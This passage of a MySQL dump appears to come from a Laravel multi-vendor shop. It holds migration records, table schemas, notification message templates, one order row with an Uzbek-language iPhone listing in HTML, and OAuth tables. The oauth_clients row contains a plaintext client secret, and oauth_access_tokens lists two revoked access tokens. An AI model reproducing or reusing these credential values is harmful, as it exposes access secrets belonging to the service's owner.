(248,'2023_10_21_113354_add_app_language_column_to_users_table',73),
(249,'2023_10_21_123433_add_app_language_column_to_sellers_table',73),
(250,'2023_10_21_124657_add_app_language_column_to_delivery_men_table',73),
(251,'2023_10_22_130225_add_attachment_to_support_tickets_table',73),
(252,'2023_10_25_113233_make_message_nullable_in_chattings_table',73),
(253,'2023_10_30_152005_make_attachment_column_type_change_to_reviews_table',73),
(254,'2024_01_14_192546_add_slug_to_shops_table',74),
(255,'2024_01_25_175421_add_country_code_to_emergency_contacts_table',75),
(256,'2024_02_01_200417_add_denied_count_and_approved_count_to_refund_requests_table',75),
(257,'2024_03_11_130425_add_seen_notification_and_notification_receiver_to_chattings_table',76),
(258,'2024_03_12_123322_update_images_column_in_refund_requests_table',76),
(259,'2024_03_21_134659_change_denied_note_column_type_to_text',76),
(260,'2024_04_03_093637_create_email_templates_table',77),
(261,'2024_04_17_102137_add_is_checked_column_to_carts_table',77),
(262,'2024_04_23_130436_create_vendor_registration_reasons_table',77),
(263,'2024_04_24_093932_add_type_to_help_topics_table',77),
(264,'2024_05_20_133216_create_review_replies_table',78),
(265,'2024_05_20_163043_add_image_alt_text_to_brands_table',78),
(266,'2024_05_26_152030_create_digital_product_variations_table',78),
(267,'2024_05_26_152339_create_product_seos_table',78),
(268,'2024_05_27_184401_add_digital_product_file_types_and_digital_product_extensions_to_products_table',78),
(269,'2024_05_30_101603_create_storages_table',78),
(270,'2024_06_10_174952_create_robots_meta_contents_table',78),
(271,'2024_06_12_105137_create_error_logs_table',78),
(272,'2024_07_03_130217_add_storage_type_columns_to_product_table',78),
(273,'2024_07_03_153301_add_icon_storage_type_to_catogory_table',78),
(274,'2024_07_03_171214_add_image_storage_type_to_brands_table',78),
(275,'2024_07_03_185048_add_storage_type_columns_to_shop_table',78),
(276,'2024_07_31_133306_create_login_setups_table',79),
(277,'2024_08_04_123750_add_preview_file_to_products_table',79),
(278,'2024_08_04_123805_create_authors_table',79),
(279,'2024_08_04_123845_create_publishing_houses_table',79),
(280,'2024_08_04_124023_create_digital_product_authors_table',79),
(281,'2024_08_04_124046_create_digital_product_publishing_houses_table',79),
(282,'2024_08_25_130313_modify_email_column_as_nullable_in_users_table',79),
(283,'2024_08_26_130313_modify_token_column_as_text_in_phone_or_email_verifications_table',79),
(284,'2024_10_01_130036_add_paid_amount_column_in_orders_table',80),
(285,'2024_10_01_131352_create_restock_products_table',80),
(286,'2024_10_01_132315_create_restock_product_customers_table',80),
(287,'2024_11_02_075917_create_stock_clearance_setups_table',81),
(288,'2024_11_02_075931_create_stock_clearance_products_table',81),
(289,'2024_11_04_162929_create_analytic_scripts_table',81),
(290,'2024_12_26_210457_create_blogs_table',82),
(291,'2024_12_26_210615_create_blog_categories_table',82),
(292,'2024_12_31_170955_bring_change_amount_column_in_orders_table',82),
(293,'2025_01_02_180849_create_blog_translations_table',82),
(294,'2025_01_12_104824_create_blog_seos_table',82),
(295,'2025_02_10_165648_change_paid_amount_column_typein_orders_table',82),
(296,'2025_03_08_201607_create_business_pages_table',83),
(297,'2025_03_08_204555_create_attachments_table',83),
(298,'2025_04_16_154104_modify_loyalty_point_column_in_users_table',83);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `most_demandeds`
--

DROP TABLE IF EXISTS `most_demandeds`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `most_demandeds` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `banner` varchar(255) NOT NULL,
  `product_id` bigint(20) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `most_demandeds`
--

LOCK TABLES `most_demandeds` WRITE;
/*!40000 ALTER TABLE `most_demandeds` DISABLE KEYS */;
/*!40000 ALTER TABLE `most_demandeds` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `notification_messages`
--

DROP TABLE IF EXISTS `notification_messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `notification_messages` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_type` varchar(191) DEFAULT NULL,
  `key` varchar(191) DEFAULT NULL,
  `message` text DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=41 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `notification_messages`
--

LOCK TABLES `notification_messages` WRITE;
/*!40000 ALTER TABLE `notification_messages` DISABLE KEYS */;
INSERT INTO `notification_messages` VALUES
(1,'customer','order_pending_message','order pen message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(2,'customer','order_confirmation_message','Order con Message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(3,'customer','order_processing_message','Order pro Message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(4,'customer','out_for_delivery_message','Order ouut Message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(5,'customer','order_delivered_message','Order del Message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(6,'customer','order_returned_message','Order hh Message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(7,'customer','order_failed_message','Order fa Message',0,'2023-10-30 11:02:55','2025-05-11 07:50:11'),
(8,'customer','order_canceled','',0,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(9,'customer','order_refunded_message','customize your order refunded message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(10,'customer','refund_request_canceled_message','customize your refund request canceled message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(11,'customer','message_from_delivery_man','customize your message from delivery man message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(12,'customer','message_from_seller','customize your message from seller message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(13,'customer','fund_added_by_admin_message','customize your fund added by admin message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(14,'seller','new_order_message','customize your new order message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(15,'seller','refund_request_message','customize your refund request message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(16,'seller','order_edit_message','customize your order edit message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(17,'seller','withdraw_request_status_message','customize your withdraw request status message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(18,'seller','message_from_customer','customize your message from customer message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(19,'seller','delivery_man_assign_by_admin_message','customize your delivery man assign by admin message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(20,'seller','order_delivered_message','customize your order delivered message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(21,'seller','order_canceled','customize your order canceled message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(22,'seller','order_refunded_message','customize your order refunded message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(23,'seller','refund_request_canceled_message','customize your refund request canceled message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(24,'seller','refund_request_status_changed_by_admin','customize your refund request status changed by admin message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(25,'delivery_man','new_order_assigned_message','',0,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(26,'delivery_man','expected_delivery_date','',0,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(27,'delivery_man','delivery_man_charge','customize your delivery man charge message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(28,'delivery_man','order_canceled','customize your order canceled message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(29,'delivery_man','order_rescheduled_message','customize your order rescheduled message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(30,'delivery_man','order_edit_message','customize your order edit message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(31,'delivery_man','message_from_seller','customize your message from seller message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(32,'delivery_man','message_from_admin','customize your message from admin message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(33,'delivery_man','message_from_customer','customize your message from customer message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(34,'delivery_man','cash_collect_by_admin_message','customize your cash collect by admin message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(35,'delivery_man','cash_collect_by_seller_message','customize your cash collect by seller message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(36,'delivery_man','withdraw_request_status_message','customize your withdraw request status message message',1,'2023-10-30 11:02:55','2023-10-30 11:02:55'),
(37,'seller','product_request_approved_message','customize your product request approved message message',1,'2024-02-19 08:35:38','2024-02-19 08:35:38'),
(38,'seller','product_request_rejected_message','customize your product request rejected message message',1,'2024-02-19 08:35:38','2024-02-19 08:35:38'),
(39,'customer','message_from_admin','customize your message from admin message',1,'2025-06-27 14:50:48','2025-06-27 14:50:48'),
(40,'seller','message_from_delivery_man','customize your message from delivery man message',1,'2025-06-27 14:50:48','2025-06-27 14:50:48');
/*!40000 ALTER TABLE `notification_messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `notification_seens`
--

DROP TABLE IF EXISTS `notification_seens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `notification_seens` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `seller_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `notification_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `notification_seens`
--

LOCK TABLES `notification_seens` WRITE;
/*!40000 ALTER TABLE `notification_seens` DISABLE KEYS */;
/*!40000 ALTER TABLE `notification_seens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `notifications`
--

DROP TABLE IF EXISTS `notifications`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `notifications` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `sent_by` varchar(255) NOT NULL DEFAULT 'system',
  `sent_to` varchar(255) NOT NULL DEFAULT 'customer',
  `title` varchar(100) DEFAULT NULL,
  `description` varchar(191) DEFAULT NULL,
  `notification_count` int(11) NOT NULL DEFAULT 0,
  `image` varchar(50) DEFAULT NULL,
  `status` tinyint(1) NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `notifications`
--

LOCK TABLES `notifications` WRITE;
/*!40000 ALTER TABLE `notifications` DISABLE KEYS */;
/*!40000 ALTER TABLE `notifications` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oauth_access_tokens`
--

DROP TABLE IF EXISTS `oauth_access_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `oauth_access_tokens` (
  `id` varchar(100) NOT NULL,
  `user_id` bigint(20) DEFAULT NULL,
  `client_id` int(10) unsigned NOT NULL,
  `name` varchar(191) DEFAULT NULL,
  `scopes` text DEFAULT NULL,
  `revoked` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `expires_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `oauth_access_tokens_user_id_index` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oauth_access_tokens`
--

LOCK TABLES `oauth_access_tokens` WRITE;
/*!40000 ALTER TABLE `oauth_access_tokens` DISABLE KEYS */;
INSERT INTO `oauth_access_tokens` VALUES
('6840b7d4ed685bf2e0dc593affa0bd3b968065f47cc226d39ab09f1422b5a1d9666601f3f60a79c1',98,1,'LaravelAuthApp','[]',1,'2021-07-05 09:25:41','2021-07-05 09:25:41','2022-07-05 15:25:41'),
('c42cdd5ae652b8b2cbac4f2f4b496e889e1a803b08672954c8bbe06722b54160e71dce3e02331544',98,1,'LaravelAuthApp','[]',1,'2021-07-05 09:24:36','2021-07-05 09:24:36','2022-07-05 15:24:36');
/*!40000 ALTER TABLE `oauth_access_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oauth_auth_codes`
--

DROP TABLE IF EXISTS `oauth_auth_codes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `oauth_auth_codes` (
  `id` varchar(100) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `client_id` int(10) unsigned NOT NULL,
  `scopes` text DEFAULT NULL,
  `revoked` tinyint(1) NOT NULL,
  `expires_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oauth_auth_codes`
--

LOCK TABLES `oauth_auth_codes` WRITE;
/*!40000 ALTER TABLE `oauth_auth_codes` DISABLE KEYS */;
/*!40000 ALTER TABLE `oauth_auth_codes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oauth_clients`
--

DROP TABLE IF EXISTS `oauth_clients`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `oauth_clients` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) DEFAULT NULL,
  `name` varchar(191) NOT NULL,
  `secret` varchar(100) NOT NULL,
  `redirect` text NOT NULL,
  `personal_access_client` tinyint(1) NOT NULL,
  `password_client` tinyint(1) NOT NULL,
  `revoked` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `provider` varchar(191) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `oauth_clients_user_id_index` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oauth_clients`
--

LOCK TABLES `oauth_clients` WRITE;
/*!40000 ALTER TABLE `oauth_clients` DISABLE KEYS */;
INSERT INTO `oauth_clients` VALUES
(1,NULL,'6amtech','GEUx5tqkviM6AAQcz4oi1dcm1KtRdJPgw41lj0eI','http://localhost',1,0,0,'2020-10-21 18:27:22','2020-10-21 18:27:22',NULL);
/*!40000 ALTER TABLE `oauth_clients` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oauth_personal_access_clients`
--

DROP TABLE IF EXISTS `oauth_personal_access_clients`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `oauth_personal_access_clients` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `client_id` int(10) unsigned NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `oauth_personal_access_clients_client_id_index` (`client_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oauth_personal_access_clients`
--

LOCK TABLES `oauth_personal_access_clients` WRITE;
/*!40000 ALTER TABLE `oauth_personal_access_clients` DISABLE KEYS */;
INSERT INTO `oauth_personal_access_clients` VALUES
(1,1,'2020-10-21 18:27:23','2020-10-21 18:27:23');
/*!40000 ALTER TABLE `oauth_personal_access_clients` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `oauth_refresh_tokens`
--

DROP TABLE IF EXISTS `oauth_refresh_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `oauth_refresh_tokens` (
  `id` varchar(100) NOT NULL,
  `access_token_id` varchar(100) NOT NULL,
  `revoked` tinyint(1) NOT NULL,
  `expires_at` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `oauth_refresh_tokens_access_token_id_index` (`access_token_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `oauth_refresh_tokens`
--

LOCK TABLES `oauth_refresh_tokens` WRITE;
/*!40000 ALTER TABLE `oauth_refresh_tokens` DISABLE KEYS */;
/*!40000 ALTER TABLE `oauth_refresh_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `offline_payment_methods`
--

DROP TABLE IF EXISTS `offline_payment_methods`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `offline_payment_methods` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `method_name` varchar(255) NOT NULL,
  `method_fields` text NOT NULL,
  `method_informations` text NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT 0,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `offline_payment_methods`
--

LOCK TABLES `offline_payment_methods` WRITE;
/*!40000 ALTER TABLE `offline_payment_methods` DISABLE KEYS */;
/*!40000 ALTER TABLE `offline_payment_methods` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `offline_payments`
--

DROP TABLE IF EXISTS `offline_payments`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `offline_payments` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` int(11) NOT NULL,
  `payment_info` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL CHECK (json_valid(`payment_info`)),
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `offline_payments`
--

LOCK TABLES `offline_payments` WRITE;
/*!40000 ALTER TABLE `offline_payments` DISABLE KEYS */;
/*!40000 ALTER TABLE `offline_payments` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `order_delivery_verifications`
--

DROP TABLE IF EXISTS `order_delivery_verifications`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `order_delivery_verifications` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint(20) unsigned NOT NULL,
  `image` text NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `order_delivery_verifications`
--

LOCK TABLES `order_delivery_verifications` WRITE;
/*!40000 ALTER TABLE `order_delivery_verifications` DISABLE KEYS */;
/*!40000 ALTER TABLE `order_delivery_verifications` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `order_details`
--

DROP TABLE IF EXISTS `order_details`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8mb4 */;
CREATE TABLE `order_details` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint(20) DEFAULT NULL,
  `product_id` bigint(20) DEFAULT NULL,
  `seller_id` bigint(20) DEFAULT NULL,
  `digital_file_after_sell` varchar(191) DEFAULT NULL,
  `product_details` text DEFAULT NULL,
  `qty` int(11) NOT NULL DEFAULT 0,
  `price` double NOT NULL DEFAULT 0,
  `tax` double NOT NULL DEFAULT 0,
  `discount` double NOT NULL DEFAULT 0,
  `tax_model` varchar(20) NOT NULL DEFAULT 'exclude',
  `delivery_status` varchar(15) NOT NULL DEFAULT 'pending',
  `payment_status` varchar(15) NOT NULL DEFAULT 'unpaid',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `shipping_method_id` bigint(20) DEFAULT NULL,
  `variant` varchar(255) DEFAULT NULL,
  `variation` varchar(255) DEFAULT NULL,
  `discount_type` varchar(30) DEFAULT NULL,
  `is_stock_decreased` tinyint(1) NOT NULL DEFAULT 1,
  `refund_request` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `order_details`
--

LOCK TABLES `order_details` WRITE;
/*!40000 ALTER TABLE `order_details` DISABLE KEYS */;
INSERT INTO `order_details` VALUES
(1,100001,3,2,NULL,'{\"id\":3,\"added_by\":\"seller\",\"user_id\":2,\"name\":\"Smartfon iPhone 16 Pro\\/Pro Max, 128\\/256 GB, 1-SIM\\/dual SIM, g\'ilof sovg\'aga\",\"slug\":\"smartfon-iphone-16-propro-max-128256-gb-1-simdual-sim-gilof-sovgaga-6nRGuP\",\"product_type\":\"physical\",\"category_ids\":\"[{\\\"id\\\":\\\"1\\\",\\\"position\\\":1},{\\\"id\\\":\\\"19\\\",\\\"position\\\":2}]\",\"category_id\":1,\"sub_category_id\":19,\"sub_sub_category_id\":null,\"brand_id\":2,\"unit\":\"kg\",\"min_qty\":1,\"refundable\":1,\"digital_product_type\":null,\"digital_file_ready\":\"\",\"digital_file_ready_storage_type\":null,\"images\":\"[{\\\"image_name\\\":\\\"2025-07-07-686b9d556e402.webp\\\",\\\"storage\\\":\\\"public\\\"},{\\\"image_name\\\":\\\"2025-07-07-686b9d55de7ce.webp\\\",\\\"storage\\\":\\\"public\\\"},{\\\"image_name\\\":\\\"2025-07-07-686b9d56476df.webp\\\",\\\"storage\\\":\\\"public\\\"},{\\\"image_name\\\":\\\"2025-07-07-686b9d568f823.webp\\\",\\\"storage\\\":\\\"public\\\"}]\",\"color_image\":\"[{\\\"color\\\":\\\"FFFF00\\\",\\\"image_name\\\":\\\"2025-07-07-686b9d556e402.webp\\\",\\\"storage\\\":\\\"public\\\"},{\\\"color\\\":\\\"FFFFFF\\\",\\\"image_name\\\":\\\"2025-07-07-686b9d55de7ce.webp\\\",\\\"storage\\\":\\\"public\\\"},{\\\"color\\\":\\\"000000\\\",\\\"image_name\\\":\\\"2025-07-07-686b9d56476df.webp\\\",\\\"storage\\\":\\\"public\\\"},{\\\"color\\\":null,\\\"image_name\\\":\\\"2025-07-07-686b9d568f823.webp\\\",\\\"storage\\\":\\\"public\\\"}]\",\"thumbnail\":\"2025-07-07-686b9d56ce1fd.webp\",\"thumbnail_storage_type\":\"public\",\"preview_file\":\"\",\"preview_file_storage_type\":\"public\",\"featured\":null,\"flash_deal\":null,\"video_provider\":\"youtube\",\"video_url\":\"https:\\/\\/www.youtube.com\\/watch?v=gcG3jiuYWOE&pp=ygUPaXBob25lIDE2IGFiem9y\",\"colors\":\"[\\\"#FFFF00\\\",\\\"#FFFFFF\\\",\\\"#000000\\\"]\",\"variant_product\":0,\"attributes\":\"null\",\"choice_options\":\"[]\",\"variation\":\"[{\\\"type\\\":\\\"Yellow\\\",\\\"price\\\":200,\\\"sku\\\":\\\"Si1PM1G1Sgs-Yellow\\\",\\\"qty\\\":5},{\\\"type\\\":\\\"White\\\",\\\"price\\\":400,\\\"sku\\\":\\\"Si1PM1G1Sgs-White\\\",\\\"qty\\\":2},{\\\"type\\\":\\\"Black\\\",\\\"price\\\":100,\\\"sku\\\":\\\"Si1PM1G1Sgs-Black\\\",\\\"qty\\\":10}]\",\"digital_product_file_types\":[],\"digital_product_extensions\":[],\"published\":0,\"unit_price\":100,\"purchase_price\":0,\"tax\":0,\"tax_type\":\"percent\",\"tax_model\":\"exclude\",\"discount\":10,\"discount_type\":\"flat\",\"current_stock\":17,\"minimum_order_qty\":1,\"details\":\"<p><span class=\\\"BodyMRegular-Long product-tabs-content tab-content editor\\\" data-test-id=\\\"block__tab-content\\\" data-v-e848732a=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: normal; margin: 0px; padding: 0px; vertical-align: baseline; font-family: Inter, serif; font-weight: 400; letter-spacing: normal; text-decoration: none; line-height: 20px; color: rgb(0, 0, 0); font-variant-ligatures: normal; font-variant-caps: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255);\\\"><div data-v-e848732a=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 0.875rem; font-style: inherit; margin: 0px; padding: 0px; vertical-align: baseline; color: rgb(31, 32, 38); font-weight: 400; white-space: pre-wrap; word-break: break-word; background-color: transparent !important;\\\"><\\/div><\\/span><\\/p><div class=\\\"info-container\\\" data-v-e848732a=\\\"\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 16px; font-style: normal; margin: 0px; padding: 0px; vertical-align: baseline; color: rgb(0, 0, 0); font-family: &quot;Times New Roman&quot;; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;\\\"><div class=\\\"BodyMRegular short-description\\\" data-test-id=\\\"block__characteristics\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px; padding: 0px; vertical-align: baseline; line-height: 18px; font-family: Inter, serif; font-weight: 400; letter-spacing: 0px; text-decoration: none; color: rgb(31, 32, 38);\\\"><ul class=\\\"list\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 16px; padding: 0px 0px 0px 16px; vertical-align: baseline; list-style: disc; display: grid; grid-template-columns: 1fr 1fr; row-gap: 10px;\\\"><li class=\\\"item\\\" data-test-id=\\\"text__attribute\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\\\">SIM kartalar soni Dual - nano SIM + eSim<\\/li><li class=\\\"item\\\" data-test-id=\\\"text__attribute\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\\\">Kamera: 48 MP ultra keng telefoto 4K , 120 fps<\\/li><li class=\\\"item\\\" data-test-id=\\\"text__attribute\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\\\">Zaryadlovchi ulagich turi - USB-C<\\/li><li class=\\\"item\\\" data-test-id=\\\"text__attribute\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\\\">Zaryadlash funktsiyalari - simsiz zaryadlash, tez zaryadlash<\\/li><li class=\\\"item\\\" data-test-id=\\\"text__attribute\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; font-size: 14px; font-style: inherit; margin: 0px 0px 12px; padding: 0px; vertical-align: baseline;\\\">O\'rnatilgan xotira - 128\\/256 GB \\/ OS versiyasi-iOS 17<\\/li><li class=\\\"item\\\" data-test-id=\\\"text__attribute\\\" data-v-1703e6e9=\\\"\\\" style=\\\"border: 0px; box-sizing: border-box; outline: none; 